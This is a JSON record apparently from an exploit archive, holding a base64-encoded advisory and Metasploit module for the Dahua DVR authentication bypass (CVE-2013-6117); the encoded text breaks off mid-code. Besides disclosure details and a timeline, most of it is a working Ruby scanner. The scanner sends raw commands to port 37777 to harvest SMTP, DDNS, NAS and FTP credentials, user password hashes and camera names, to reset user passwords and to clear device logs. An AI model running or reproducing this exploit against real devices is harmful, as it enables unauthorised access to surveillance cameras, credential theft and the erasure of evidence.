{
    "source": "exploit-database", 
    "exploit": "RGFodWEgRFZSIEF1dGhlbnRpY2F0aW9uIEJ5cGFzcyAtIENWRS0yMDEzLTYxMTcNCg0KLS1TdW1tYXJ5LS0NCg0KRGFodWEgd2ViLWVuYWJsZWQgRFZScyBhbmQgcmVicmFuZGVkIHZlcnNpb25zIGRvIG5vdCBlbmZvcmNlIGF1dGhlbnRpY2F0aW9uIG9uIHRoZWlyIGFkbWluaXN0cmF0aXZlIHNlcnZpY2VzLg0KDQojIFpoZWppYW5nIERhaHVhIFRlY2hub2xvZ3kgQ28uLCBMdGQuDQojIGh0dHA6Ly93d3cuZGFodWFzZWN1cml0eS5jb20NCg0KLS1BZmZlY3RzLS0NCg0KIyBEYWh1YSB3ZWItZW5hYmxlZCBEVlJzDQojIERhaHVhLXJlYnJhbmRlZCB3ZWItZW5hYmxlZCBEVlJzDQojIFZlcmlmaWVkIG9uIHYyLjYwOC4wMDAwLjAgYW5kIDIuNjA4LkdWMDAuMA0KDQotLURldGFpbHMtLQ0KDQpEYWh1YSB3ZWItZW5hYmxlZCBEVlJzIHV0aWxpemUgZmF0LWNsaWVudCB1dGlsaXRpZXMgbGlrZSBQU1MsIG1vYmlsZSBjbGllbnQgaW50ZXJmYWNlcyBsaWtlIGlETVNTLCBhbmQgYW4gQWN0aXZlWCBjb250cm9sLCAid2VicmVjLmNhYiIgZm9yIGJyb3dzZXItYmFzZWQgYWNjZXNzLiBUaGVzZSBjbGllbnRzIGNvbW11bmljYXRlIHdpdGggYW4gYWRtaW5pc3RyYXRpdmUgc2VydmljZSB3aGljaCBydW5zIG9uIFRDUCBwb3J0IDM3Nzc3IGJ5IGRlZmF1bHQgYW5kIGNhbiBiZSBjaGFuZ2VkLiBBdCBsZWFzdCBpbiB0aGUgY2FzZSBvZiB0aGUgQWN0aXZlWCBjb250cm9sLCBhIHNpbXBsZSBiaW5hcnkgcHJvdG9jb2wgaXMgdXNlZC4gVGhlIHZhcmlvdXMgY29tbWFuZHMgc3VwcG9ydGVkIGJ5IHRoZSBzZXJ2ZXIgYXJlIG5vdCBhdXRob3JpemVkIGluIGFueSB3YXkuIEF1dGhlbnRpY2F0aW9uIHNpbXBseSBzZXJ2ZXMgYXMgYSB3YXkgdG8gbGV0IHRoZSBjbGllbnQgdHJhbnNpdGlvbiBwYXN0IHRoZSBsb2dpbiBzY3JlZW4uIFZhcmlvdXMgY29tbWFuZHMgY2FuIGJlIHJlcGxheWVkIHRvIGFueSBEVlIgc2FucyBhdXRoZW50aWNhdGlvbi4gVGhlc2UgaW5jbHVkZToNCg0KIyBHZXQgdGhlIGZpcm13YXJlIHZlcnNpb24NCiMgR2V0IHRoZSBzZXJpYWwgbnVtYmVyDQojIEdldCB0aGUgZW1haWwgc2V0dGluZ3MgKGluY2x1ZGVzIHVzZXJuYW1lLCBTTVRQIHNlcnZlciwgYW5kIGNsZWFydGV4dCBjcmVkcykNCiMgR2V0IHRoZSBERE5TIHNldHRpbmdzIChpbmNsdWRlcyB0aGUgREROUyBzZXJ2aWNlLCBzZXJ2ZXIsIGFuZCBjbGVhcnRleHQgY3JlZHMpDQojIEdldCB0aGUgTkFTIHNldHRpbmdzIChhZ2FpbiwgY2xlYXJ0ZXh0IGNyZWRzKQ0KIyBHZXQgdGhlIHVzZXJzICh1c2VybmFtZSwgZ3JvdXAgbWVtYmVyc2hpcCwgYW5kIGhhc2hlZCBwYXNzd29yZHMpDQojIEdldCB0aGUgdXNlciBncm91cHMgKGdyb3VwIG5hbWUsIGRlc2NyaXB0aW9uLCBldGMpDQojIEdldCB0aGUgY2hhbm5lbHMgKGNhbWVyYSBjaGFubmVsIG5hbWVzLCBlLmcuICJiZWRyb29tIiAiY29jaW5hIikNCiMgQ2xlYXIgdGhlIGxvZ3MgKGhhbmR5KQ0KIyBDaGFuZ2UgYSB1c2VyJ3MgcGFzc3dvcmQgKHVuYXV0aG9yaXplZCBhY2Nlc3MpDQoNCk1vcmUgRGV0YWlsczogaHR0cDovL2Jsb2cuZGVwdGhzZWN1cml0eS5jb20vMjAxMy8xMS9kYWh1YS1kdnItYXV0aGVudGljYXRpb24tYnlwYXNzLWN2ZS5odG1sDQoNCi0tTWV0YVNwbG9pdCBNb2R1bGUtLQ0KDQpXZSB3cm90ZSBhIE1ldGFTcGxvaXQgc2Nhbm5lciBtb2R1bGUgYXMgYSBwcm9vZiBvZiBjb25jZXB0LiBJdCBpcyBtdWx0aXRocmVhZGVkIGFuZCBjYW4gbG9vayBmb3IgYSBzcGVjaWZpZWQgcG9ydCwgc2NhbiBuZXR3b3JrcywgZmluZCBEVlJzLCBnZXQgYWxsIHRoZSBhYm92ZSBpbmZvLCBjaGFuZ2UgYSB1c2VyJ3MgcGFzc3dvcmQsIGFuZCBjbGVhciB0aGUgbG9ncyB3aGVuIGl0J3MgdGhyb3VnaC4gDQoNCiMgR0lUIFJlcG86IGh0dHBzOi8vZ2l0aHViLmNvbS9kZXB0aHNlY3VyaXR5L2RhaHVhX2R2cl9hdXRoX2J5cGFzcy5naXQNCg0KLS1PdGhlciBDb25jZXJucy0tDQoNCiMgU29tZSBuZWFybHkgc2ltdWx0YW5lb3VzIHJlc2VhcmNoIGluZGVwZW5kZW50IG9mIG1pbmU6IGh0dHA6Ly93d3cua2IuY2VydC5vcmcvdnVscy9pZC84MDAwOTQgDQojIENWRS0yMDEzLTM2MTI6IERWUnMgbGlzdGVuIGZvciB0ZWxuZXQgYnkgZGVmYXVsdCBhbmQgdGhlIHJvb3QgcGFzc3dvcmQgaXMgc3RhdGljIGFuZCBwdWJsaWNseSBrbm93biBvbiBhbGwgZGV2aWNlcy4gKGh0dHA6Ly93d3cuY2N0dmZvcnVtLmNvbS92aWV3dG9waWMucGhwP2Y9MyZ0PTMyNDA4KSANCiMgT3RoZXIgYmFja2Rvb3IgYWNjb3VudHMgZXhpc3QsIGluY2x1ZGluZyBvbmUgd2l0aCBhIHJldm9sdmluZyBwYXNzd29yZCB0aGF0IGlzIGEgc2ltcGxlIGRhdGUgaGFzaC4NCiMgQ1ZFLTIwMTMtMzYxMzogVVBuUCByZXF1ZXN0cyBmcm9tIHVudHJ1c3RlZCBhZGRyZXNzZXMgaXMgc3VwcG9ydGVkIGFuZCBjb3VsZCBiZSB1c2VkIHRvIGdldCBwdWJsaWNseSBhY2Nlc3NpYmxlIHRlbG5ldCBvbiBhIERWUi4NCiMgQ1ZFLTIwMTMtMzYxNDogUGFzc3dvcmRzIGFyZSBsaW1pdGVkIHRvIDYgY2hhcnMuDQojIENWRS0yMDEzLTM2MTU6IEEgd2VhayA0OC1iaXQgaGFzaCBpcyB1dGlsaXplZCB0byBwcm90ZWN0IERWUiBhY2NvdW50IHBhc3N3b3Jkcy4gDQojIFdlIGFkbWl0dGVkbHkgZGlkIG5vdCBwZXJmb3JtIGFueSBzZXJpb3VzIGZ1enppbmcgb2YgdGhlIHZ1bG5lcmFibGUgc2VydmljZSBzbyB0aGVyZSBpcyBhIGxhcmdlIHBvdGVudGlhbCBmb3IgbW9yZSBzZXJpb3VzIHZ1bG5lcmFiaWxpdGllcyB0aGF0IGFsbG93IFJDRS4gDQojIEFsc28sIHRoZSBEVlJzIGxpc3RlbiBvbiBtYW55IGRpZmZlcmVudCBwb3J0cyBpbmNsdWRpbmcgdGVsbmV0IGJlc2lkZXMgdGhvc2UgbmVjZXNzYXJ5IGZvciB3ZWIgYWNjZXNzIChUQ1AvODAsMzc3NzcsJjM3Nzc4IGJ5IGRlZmF1bHQpLiANCiMgU01UUCwgTkFTLCBhbmQgREROUyBjcmVkZW50aWFscyB3ZXJlIGFsbCBzdG9yZWQgYW5kIHRyYW5zZmVycmVkIGluIGNsZWFydGV4dC4gDQoNCi0tTWl0aWdhdGlvbi0tDQoNClRoZSBiZXN0IGFkdmljZSBmb3Igbm93IGlzIHRvIG1ha2Ugc3VyZSB0aGVzZSBkZXZpY2VzIGFyZSBub3QgcHVibGljbHkgYWNjZXNzaWJsZSB0byB0aGUgaW50ZXJuZXQuIERhaHVhIGluaXRpYWxseSBzdGF0ZWQgdGhleSB3b3VsZCB3b3JrIG9uIGZpeGluZyB0aGUgaXNzdWVzIGJ1dCB3ZW50IHJhZGlvIHNpbGVudCBhZnRlcndhcmRzLg0KDQotLVRpbWVsaW5lLS0NCg0KIyA4LzI2LzIwMTM6IElkZW50aWZpZWQgYXV0aG9yaXphdGlvbiBmbGF3DQojIDgvMjcvMjAxMzogV3JvdGUgcHJvb2Ygb2YgY29uY2VwdCB0b29sL3NjYW5uZXINCiMgOC8yOC8yMDEzOiBEaXNjbG9zZWQgaXNzdWUgdG8gRGFodWENCiMgOC8zMC8yMDEzOiBSZWNlaXZlZCBpbml0aWFsIHJlc3BvbnNlIGZyb20gRGFodWEgaW5jbHVkaW5nIHJlcXVlc3QgZm9yIG1vcmUgaW5mbw0KIyA4LzMwLzIwMTM6IFJlc3BvbmRlZCB0byBEYWh1YSB3aXRoIHJlcXVlc3RlZCBpbmZvDQojIDkvMi8yMDEzOiBSZWNlaXZlZCBjb25maXJtYXRpb24gdGhhdCBEYWh1YSBSJkQgaXMgd29ya2luZyB0byBmaXggdGhlIGlzc3VlDQojIDEwLzIvMjAxMzogUmVxdWVzdGVkIHN0YXR1cyB1cGRhdGUgZnJvbSBEYWh1YQ0KIyAxMC8xMC8yMDEzOiBSZS1yZXF1ZXN0ZWQgc3RhdHVzIHVwZGF0ZSBmcm9tIERhaHVhIGFmdGVyIG5vIHJlc3BvbnNlIGZyb20gMTAvMi8yMDEzDQojIDExLzEzLzIwMTM6IFB1YmxpY2x5IGRpc2Nsb3NlZCB2dWxuZXJhYmlsaXR5DQoNCkpha2UgUmV5bm9sZHMgLSBQYXJ0bmVyIC8gUHJpbmNpcGFsIENvbnN1bHRhbnQgICANCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6QXV4aWxpYXJ5DQogICAgICAgIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OlRjcA0KICAgICAgICBpbmNsdWRlIE1zZjo6QXV4aWxpYXJ5OjpTY2FubmVyDQoJaW5jbHVkZSBNc2Y6OkF1eGlsaWFyeTo6UmVwb3J0DQoNCiAgICAgICAgZGVmIGluaXRpYWxpemUNCiAgICAgICAgICAgICAgICBzdXBlcigNCiAgICAgICAgICAgICAgICAgICAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ0RhaHVhIERWUiBBdXRoIEJ5cGFzIFNjYW5uZXInLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ1ZlcnNpb24nICAgICAgICA9PiAnJFJldmlzaW9uOiAxICQnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAnU2NhbnMgZm9yIERhaHVhLWJhc2VkIERWUnMgYW5kIHRoZW4gZ3JhYnMgc2V0dGluZ3MuIE9wdGlvbmFsbHkgcmVzZXRzIGEgdXNlclwncyBwYXNzd29yZCBhbmQgY2xlYXJzIHRoZSBkZXZpY2UgbG9ncycsDQogICAgICAgICAgICAgICAgICAgICAgICAnQXV0aG9yJyAgICAgICAgID0+ICdKYWtlIFJleW5vbGRzIC0gRGVwdGggU2VjdXJpdHknLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRQ0KICAgICAgICAgICAgICAgICkNCgkJZGVyZWdpc3Rlcl9vcHRpb25zKCdSSE9TVCcpDQogICAgICAgICAgICAgICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgICAgICAgICAgICAgICAgICAgIFsNCiAJCQkJT3B0U3RyaW5nLm5ldygnVVNFUk5BTUUnLCBbdHJ1ZSwgJ0EgdXNlcm5hbWUgdG8gcmVzZXQnLCAnODg4ODg4J10pLA0KIAkJCQlPcHRTdHJpbmcubmV3KCdQQVNTV09SRCcsIFt0cnVlLCAnQSBwYXNzd29yZCB0byByZXNldCB0aGUgdXNlciB3aXRoJywgJ2FiYzEyMyddKSwNCgkJCQlPcHRCb29sLm5ldygnUkVTRVQnLCBbdHJ1ZSwgJ1Jlc2V0IGFuIGV4aXN0aW5nIHVzZXJcJ3MgcHc/JywgJ0ZBTFNFJ10pLA0KCQkJCU9wdEJvb2wubmV3KCdDTEVBUl9MT0dTJywgW3RydWUsICdDbGVhciB0aGUgRFZSIGxvZ3Mgd2hlbiB3ZVwncmUgZG9uZT8nLCAnVFJVRSddKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT3B0OjpSUE9SVCgzNzc3NykNCiAgICAgICAgICAgICAgICAgICAgICAgIF0sIHNlbGYuY2xhc3MpDQogICAgICAgIGVuZA0KDQogICAgICAgIGRlZiBydW5faG9zdChpcCkNCgkJdXNlcmNvdW50ID0gMA0KCQl1MSA9ICJceGExXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQoJCSAgICAgIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiDQoJCWR2cl9yZXNwID0gIlx4YjFceDAwXHgwMFx4NThceDAwXHgwMFx4MDBceDAwIg0KCQl2ZXJzaW9uID0gIlx4YTRceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwOFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiICsNCgkJCSAgIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiDQoJCWVtYWlsID0gIlx4YTNceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHg2M1x4NmZceDZlXHg2Nlx4NjlceDY3XHgwMFx4MDAiICsNCgkJCSAiXHgwYlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCINCgkJZGRucyA9ICJceGEzXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4NjNceDZmXHg2ZVx4NjZceDY5XHg2N1x4MDBceDAwIiArDQoJCQkiXHg4Y1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCINCgkJbmFzID0gIlx4YTNceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHg2M1x4NmZceDZlXHg2Nlx4NjlceDY3XHgwMFx4MDAiICsNCgkJICAgICAgIlx4MjVceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiDQoJCWNoYW5uZWxzID0gIlx4YThceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiICsNCgkJCSAgICAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIgKw0KCQkJICAgICJceGE4XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQoJCQkgICAgIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiDQoJCWdyb3VwcyA9ICJceGE2XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDVceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQoJCQkgICJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIg0KCQl1c2VycyA9ICJceGE2XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDlceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQoJCQkgICJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIg0KCQlzbiA9ICJceGE0XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDdceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQoJCSAgICAgICJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIg0KCQljbGVhcl9sb2dzID0gICJceDYwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4OTBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQoJCQkgICAgICAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCINCgkJY2xlYXJfbG9nczIgPSAiXHg2MFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDA5XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIgKw0KCQkJICAgICAgIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiDQoJCXVzZXIgPSAicm9vdCINCgkJcGFzcyA9ICIgdyINCgkJdXNlcjhwd2hhc2ggPSAiNFd6d3hYeE0iICM4ODg4ODgNCgkJdXNlcjZwd2hhc2ggPSAic2gxNXlmRk0iICM2NjY2NjYNCgkJdXNlcmFkbWlucHdoYXNoID0gIjZRTk1JUUdlIiAjYWRtaW4NCiAgICAgICAgICAgICAgICBjb25uZWN0KCkNCgkJc29jay5wdXQodTEpDQoJCWRhdGEgPSBzb2NrLnJlY3YoOCkJDQoJCWRpc2Nvbm5lY3QoKQ0KCQlpZiBkYXRhID09IGR2cl9yZXNwDQoJCQlwcmludF9nb29kKCJEVlIgRk9VTkQ6IEAgI3tyaG9zdH06I3tycG9ydH0hIikNCgkJCXJlcG9ydF9zZXJ2aWNlKDpob3N0ID0+IHJob3N0LCA6cG9ydCA9PiBycG9ydCwgOnNuYW1lID0+ICdkdnInLCA6aW5mbyA9PiAiRGFodWEtYmFzZWQgRFZSIikNCgkJCWNvbm5lY3QoKQ0KCQkJc29jay5wdXQodmVyc2lvbikNCgkJCWRhdGEgPSBzb2NrLmdldCgxMDI0KQ0KCQkJaWYgZGF0YSA9fiAvW1x4MDBdezgsfShbWzpwcmludDpdXSspLw0KCQkJCXZlciA9ICQxDQoJCQkJcHJpbnRfc3RhdHVzKCJWZXJzaW9uOiAje3Zlcn0gQCAje3Job3N0fToje3Jwb3J0fSEiKQ0KCQkJZW5kDQoNCgkJCXNvY2sucHV0KHNuKQ0KCQkJZGF0YSA9IHNvY2suZ2V0KDEwMjQpDQoJCQlpZiBkYXRhID1+IC9bXHgwMF17OCx9KFtbOnByaW50Ol1dKykvDQoJCQkJc2VyaWFsID0gJDENCgkJCQlwcmludF9zdGF0dXMoIlNlcmlhbCBOdW1iZXI6ICN7c2VyaWFsfSBAICN7cmhvc3R9OiN7cnBvcnR9ISIpDQoJCQllbmQNCgkJCQ0KCQkJc29jay5wdXQoZW1haWwpDQoJCQlpZiBkYXRhID0gc29jay5nZXQoMTAyNCkuc3BsaXQoJyYmJykNCgkJCQlwcmludF9zdGF0dXMoIkVtYWlsIFNldHRpbmdzOiBAICN7cmhvc3R9OiN7cnBvcnR9ISIpDQoJCQkJaWYgZGF0YVswXSA9fiAvKFtceDAwXXs4LH0oPz0uezEsMjU1fSQpWzAtOUEtWmEtel0oPzooPzpbMC05QS1aYS16XXwtKXswLDYxfVswLTlBLVphLXpdKT8oPzpcLlswLTlBLVphLXpdKD86KD86WzAtOUEtWmEtel18LSl7MCw2MX1bMC05QS1aYS16XSk/KSpcLj8rOlxkKykvDQoJCQkJCWlmIG1haWxob3N0ID0gJDEuc3BsaXQoJzonKQ0KCQkJCQkJcHJpbnRfc3RhdHVzKCIJU2VydmVyOiAje21haWxob3N0WzBdfSIpICBpZiAhbWFpbGhvc3RbMF0ubmlsPw0KCQkJCQkJcHJpbnRfc3RhdHVzKCIJRGVzdGluYXRpb24gRW1haWw6ICN7ZGF0YVsxXX0iKSAgaWYgIW1haWxob3N0WzFdLm5pbD8NCgkJCQkJZW5kDQoJCQkJCWlmICFkYXRhWzVdLm5pbD8gYW5kICFkYXRhWzZdLm5pbD8NCgkJCQkJCXByaW50X2dvb2QoIglTTVRQIFVzZXI6ICN7ZGF0YVs1XX0iKSBpZiAhZGF0YVs1XS5uaWw/DQoJCQkJCQlwcmludF9nb29kKCIJU01UUCBQYXNzd29yZDogI3tkYXRhWzZdfSIpIGlmICFkYXRhWzZdLm5pbD8NCgkJCQkJCXJlcG9ydF9hdXRoX2luZm8oOmhvc3QgPT4gbWFpbGhvc3RbMF0sIDpwb3J0ID0+IG1haWxob3N0WzFdLCA6dXNlciA9PiBkYXRhWzVdLCANCgkJCQkJCSAgICAgICAgICAgICAgICAgOnBhc3MgPT4gZGF0YVs2XSwgOnR5cGUgPT4gIk1haWwiLCA6YWN0aXZlID0+IHRydWUpIGlmICggIW1haWxob3N0WzBdLm5pbD8gYW5kIA0KCQkJCQkJCQkgIW1haWxob3N0WzFdLm5pbD8gYW5kICFkYXRhWzVdLm5pbD8gYW5kICFkYXRhWzZdLm5pbD8gKQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQkJDQoJCQlzb2NrLnB1dChkZG5zKQ0KCQkJaWYgZGF0YSA9IHNvY2suZ2V0KDEwMjQpDQoJCQkJZGF0YSA9IGRhdGEuc3BsaXQoLyYmWzAtMV0mJi8pDQoJCQkJZGF0YS5lYWNoX3dpdGhfaW5kZXggew0KCQkJCQl8dmFsLCBpbmRleHwNCgkJCQkJaWYgaW5kZXggPiAwDQoJCQkJCQl2YWwgPSB2YWwuc3BsaXQoIiYmIikNCgkJCQkJCXByaW50X3N0YXR1cygiREROUyBTZXR0aW5ncyBAICN7cmhvc3R9OiN7cnBvcnR9IToiKQ0KCQkJCQkJcHJpbnRfc3RhdHVzKCIJREROUyBTZXJ2aWNlOiAje3ZhbFswXX0iKSBpZiAhdmFsLm5pbD8NCgkJCQkJCXByaW50X3N0YXR1cygiCURETlMgU2VydmVyOiAgI3t2YWxbMV19IikgaWYgIXZhbC5uaWw/DQoJCQkJCQlwcmludF9zdGF0dXMoIglERE5TIFBvcnQ6ICN7dmFsWzJdfSIpIGlmICF2YWwubmlsPw0KCQkJCQkJcHJpbnRfc3RhdHVzKCIJRG9tYWluOiAje3ZhbFszXX0iKSBpZiAhdmFsLm5pbD8NCgkJCQkJCXByaW50X2dvb2QoIglVc2VybmFtZTogI3t2YWxbNF19IikgaWYgIXZhbC5uaWw/DQoJCQkJCQlwcmludF9nb29kKCIJUGFzc3dvcmQ6ICN7dmFsWzVdfSIpIGlmICF2YWwubmlsPw0KCQkJCQkJcmVwb3J0X2F1dGhfaW5mbyg6aG9zdCA9PiB2YWxbMV0sIDpwb3J0ID0+IHZhbFsyXSwgOnVzZXIgPT4gdmFsWzRdLCA6cGFzcyA9PiB2YWxbNV0sIDp0eXBlID0+ICJERE5TIiwgDQoJCQkJCQkJCTphY3RpdmUgPT4gdHJ1ZSkgaWYgKCAhdmFsWzFdLm5pbD8gYW5kICF2YWxbMl0ubmlsPyBhbmQgIXZhbFs0XS5uaWw/IGFuZCAhdmFsWzVdLm5pbD8gKQ0KCQkJCQllbmQNCgkJCQkNCgkJCQl9DQoJCQllbmQNCgkJCQ0KCQkJc29jay5wdXQobmFzKQ0KCQkJaWYgZGF0YSA9IHNvY2suZ2V0KDEwMjQpDQoJCQkJcHJpbnRfc3RhdHVzKCJOYXMgU2V0dGluZ3MgQCAje3Job3N0fToje3Jwb3J0fSE6IikNCgkJCQlzZXJ2ZXIgPSAnJw0KCQkJCXBvcnQgPSAnJw0KCQkJCWlmIGRhdGEgPX4gL1tceDAwXXs4LH1bXHgwMV1bXHgwMF17MywzfShbXHgwLTlhLWZdezQsNH0pKFtceDAtOWEtZl17MiwyfSkvDQoJCQkJICBzZXJ2ZXIgPSAgJDEudW5wYWNrKCdDKicpLmpvaW4oJy4nKQ0KCQkJCSAgcG9ydCA9ICQyLnVucGFjaygnUycpDQoJCQkJICBwcmludF9zdGF0dXMoIglOYXMgU2VydmVyICN7c2VydmVyfSIpDQoJCQkJICBwcmludF9zdGF0dXMoIglOYXMgUG9ydDogI3twb3J0fSIpDQoJCQkJZW5kDQoJCQkJaWYgZGF0YSA9fiAvW1x4MDBdezE2LH0oW1s6cHJpbnQ6XV0rKVtceDAwXXsxNix9KFtbOnByaW50Ol1dKykvDQoJCQkJCWZ0cHVzZXIgPSAkMQ0KCQkJCQlmdHBwYXNzID0gJDINCgkJCQkJcHJpbnRfZ29vZCgiCUZUUCBVc2VyOiAje2Z0cHVzZXJ9IikNCgkJCQkJcHJpbnRfZ29vZCgiCUZUUCBQYXNzd29yZDogI3tmdHBwYXNzfSIpDQoJCQkJCSNyZXBvcnRfYXV0aF9pbmZvKDpob3N0ID0+IHNlcnZlciwgOnBvcnQgPT4gcG9ydCwgOnVzZXIgPT4gZnRwdXNlciwgOnBhc3MgPT4gZnRwcGFzcywgOnR5cGUgPT4gIkZUUCIsIA0KCQkJCQkJICAjOmFjdGl2ZSA9PiB0cnVlKSBpZiAoICFzZXJ2ZXIubmlsPyBhbmQgIXBvcnQubmlsPyBhbmQgIWZ0cHVzZXIubmlsPyBhbmQgIWZ0cHBhc3MubmlsPyApDQoJCQkJZW5kDQoJCQllbmQNCgkJCQ0KCQkJc29jay5wdXQoY2hhbm5lbHMpDQoJCQlkYXRhID0gc29jay5nZXQoMTAyNCkuc3BsaXQoJyYmJykNCgkJCWRpc2Nvbm5lY3QoKQ0KCQkJaWYgKGRhdGEubGVuZ3RoID4gMSkNCgkJCQlwcmludF9zdGF0dXMoIkNhbWVyYSBDaGFubmVscyBAICN7cmhvc3R9OiN7cnBvcnR9IToiKQ0KCQkJCWRhdGEuZWFjaF93aXRoX2luZGV4IHsgDQoJCQkJCXx2YWwsIGluZGV4fA0KCQkJCQlwcmludF9zdGF0dXMoIgkje2luZGV4KzF9OiN7dmFsWy8oW1s6cHJpbnQ6XV0rKS9dfSIpDQoJCQkJfQ0KCQkJZW5kDQoJCQljb25uZWN0KCkNCgkJCXNvY2sucHV0KHVzZXJzKQ0KCQkJaWYgZGF0YSA9IHNvY2suZ2V0KDEwMjQpLnNwbGl0KCcmJicpDQoJCQkJcHJpbnRfc3RhdHVzKCJVc2Vyc1xcSGFzaGVkIFBhc3N3b3Jkc1xcUmlnaHRzXFxEZXNjcmlwdGlvbjogQCAje3Job3N0fToje3Jwb3J0fSEiKQ0KCQkJCWRhdGEuZWFjaCB7IA0KCQkJCQl8dmFsfCANCgkJCQkJdXNlcmNvdW50ICs9IDENCgkJCQkJcHJpbnRfc3RhdHVzKCIJI3t2YWxbLygoW1xkXSspWzpdKFtbOnByaW50Ol1dKykpL119IikNCgkJCQl9DQoJCQllbmQNCgkJCXNvY2sucHV0KGdyb3VwcykNCgkJCWlmIGRhdGEgPSBzb2NrLmdldCgxMDI0KS5zcGxpdCgnJiYnKQ0KCQkJCXByaW50X3N0YXR1cygiVXNlciBHcm91cHM6IEAgI3tyaG9zdH06I3tycG9ydH0hIikNCgkJCQlkYXRhLmVhY2ggeyANCgkJCQkJfHZhbHwgDQoJCQkJCXByaW50X3N0YXR1cygiCSN7dmFsWy8oKFtcZF0rKVs6XShbXHddKykpL119IikNCgkJCQl9DQoJCQllbmQNCgkJCWlmIChkYXRhc3RvcmVbJ1JFU0VUJ10pDQoJCQkJdXNlcnN0cmluZyA9IGRhdGFzdG9yZVsnVVNFUk5BTUUnXSArICI6SW50ZWw6IiArIGRhdGFzdG9yZVsnUEFTU1dPUkQnXSArDQoJCQkJCSI6IiArICBkYXRhc3RvcmVbJ1BBU1NXT1JEJ10NCgkJCQl1MSA9ICJceGE0XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MWFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQoJCQkJICAgICAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCINCgkJCQl1MiA9ICJceGE0XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDhceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQoJCQkJICAgICAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCINCgkJCQl1MyA9ICJceGE2XHgwMFx4MDBceDAwI3t1c2Vyc3RyaW5nLmxlbmd0aC5jaHJ9XHgwMFx4MDBceDAwXHgwYVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiICsNCgkJCQkgICAgICJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQoJCQkJICAgICB1c2Vyc3RyaW5nDQoJCQkJc29jay5wdXQodTEpDQoJCQkJZGF0YSA9IHNvY2suZ2V0KDEwMjQpDQoJCQkJc29jay5wdXQodTIpDQoJC